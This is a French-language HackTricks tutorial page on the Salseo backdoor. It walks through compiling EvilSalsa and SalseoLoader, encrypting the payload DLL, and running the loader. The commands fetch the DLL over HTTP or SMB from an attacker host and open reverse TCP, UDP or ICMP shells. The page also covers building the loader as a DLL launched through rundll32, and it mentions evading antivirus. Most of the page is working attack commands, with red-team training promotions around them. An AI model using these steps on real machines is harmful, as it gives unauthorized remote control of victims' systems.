# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Compiler les binaires

Téléchargez le code source depuis github et compilez **EvilSalsa** et **SalseoLoader**. Vous aurez besoin de **Visual Studio** installé pour compiler le code.

Compilez ces projets pour l'architecture de la machine Windows où vous allez les utiliser (Si Windows prend en charge x64, compilez-les pour cette architecture).

Vous pouvez **sélectionner l'architecture** dans Visual Studio dans l'**onglet "Build" à gauche** dans **"Platform Target".**

(\*\*Si vous ne trouvez pas ces options, cliquez sur **"Project Tab"** puis sur **"\<Nom du Projet> Properties"**)

![](<../.gitbook/assets/image (839).png>)

Ensuite, construisez les deux projets (Build -> Build Solution) (Dans les logs, le chemin de l'exécutable apparaîtra) :

![](<../.gitbook/assets/image (381).png>)

## Préparer le Backdoor

Tout d'abord, vous devrez encoder le **EvilSalsa.dll.** Pour ce faire, vous pouvez utiliser le script python **encrypterassembly.py** ou vous pouvez compiler le projet **EncrypterAssembly** :

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, maintenant vous avez tout ce dont vous avez besoin pour exécuter toutes les choses Salseo : le **EvilDalsa.dll encodé** et le **binaire de SalseoLoader.**

**Téléchargez le binaire SalseoLoader.exe sur la machine. Ils ne devraient pas être détectés par un AV...**

## **Exécuter le backdoor**

### **Obtenir un shell inverse TCP (télécharger dll encodé via HTTP)**

N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inverse et un serveur HTTP pour servir l'evilsalsa encodé.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obtenir un shell inverse UDP (téléchargement d'un dll encodé via SMB)**

N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inverse, et un serveur SMB pour servir l'evilsalsa encodé (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obtenir un shell inverse ICMP (dll encodée déjà à l'intérieur de la victime)**

**Cette fois, vous avez besoin d'un outil spécial sur le client pour recevoir le shell inverse. Téléchargez :** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Désactiver les réponses ICMP :**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Exécuter le client :
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### À l'intérieur de la victime, exécutons le truc salseo :
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compiler SalseoLoader en tant que DLL exportant la fonction principale

Ouvrez le projet SalseoLoader avec Visual Studio.

### Ajoutez avant la fonction principale : \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Installer DllExport pour ce projet

#### **Outils** --> **Gestionnaire de packages NuGet** --> **Gérer les packages NuGet pour la solution...**

![](<../.gitbook/assets/image (881).png>)

#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir), et appuyez sur Installer (et acceptez la fenêtre contextuelle)**

![](<../.gitbook/assets/image (100).png>)

Dans votre dossier de projet, les fichiers suivants sont apparus : **DllExport.bat** et **DllExport\_Configure.bat**

### **D** désinstaller DllExport

Appuyez sur **Désinstaller** (ouais, c'est bizarre mais faites-moi confiance, c'est nécessaire)

![](<../.gitbook/assets/image (97).png>)

### **Quittez Visual Studio et exécutez DllExport\_configure**

Il suffit de **quitter** Visual Studio

Ensuite, allez dans votre **dossier SalseoLoader** et **exécutez DllExport\_Configure.bat**

Sélectionnez **x64** (si vous allez l'utiliser à l'intérieur d'une boîte x64, c'était mon cas), sélectionnez **System.Runtime.InteropServices** (dans **Namespace for DllExport**) et appuyez sur **Appliquer**

![](<../.gitbook/assets/image (882).png>)

### **Ouvrez à nouveau le projet avec Visual Studio**

**\[DllExport]** ne devrait plus être marqué comme erreur

![](<../.gitbook/assets/image (670).png>)

### Construire la solution

Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Propriétés de SalseoLoader --> Application --> Type de sortie = Bibliothèque de classes)

![](<../.gitbook/assets/image (847).png>)

Sélectionnez **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Build --> Cible de la plateforme = x64)

![](<../.gitbook/assets/image (285).png>)

Pour **construire** la solution : Build --> Build Solution (Dans la console de sortie, le chemin de la nouvelle DLL apparaîtra)

### Tester la DLL générée

Copiez et collez la DLL où vous souhaitez la tester.

Exécutez :
```
rundll32.exe SalseoLoader.dll,main
```
Si aucune erreur n'apparaît, vous avez probablement un DLL fonctionnel !!

## Obtenir un shell en utilisant le DLL

N'oubliez pas d'utiliser un **serveur** **HTTP** et de définir un **écouteur** **nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
